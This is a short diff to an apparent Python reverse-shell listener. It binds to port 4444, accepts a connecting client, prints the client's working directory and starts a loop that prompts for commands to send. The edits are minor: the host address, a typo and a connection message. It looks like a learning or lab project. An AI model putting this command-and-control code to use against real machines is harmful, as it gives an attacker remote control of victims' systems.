@@ -1,6 +1,6 @@
 import socket
 
-SERVER_HOST = "127.0.0.1"
+SERVER_HOST = "10.0.1.24" # desktop
 SERVER_PORT = 4444
 BUFFER_SIZE = 1024*128 # max size of messages
 
@@ -15,11 +15,14 @@ s.bind((SERVER_HOST, SERVER_PORT))
 s.listen(5)
 print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
+
 # Accept client to connect
-client_socket, client_adress = s.accept()
+client_socket, client_address = s.accept()
+
+print(f"{client_address[0]}:{client_address[1]} Connected!")
 
 cwd = client_socket.recv(BUFFER_SIZE).decode()
-print("[+] Current working directory", cwd);
+print("[+] Current working directory", cwd)
 
 while True:
     command = input(f"{cwd} $> ")
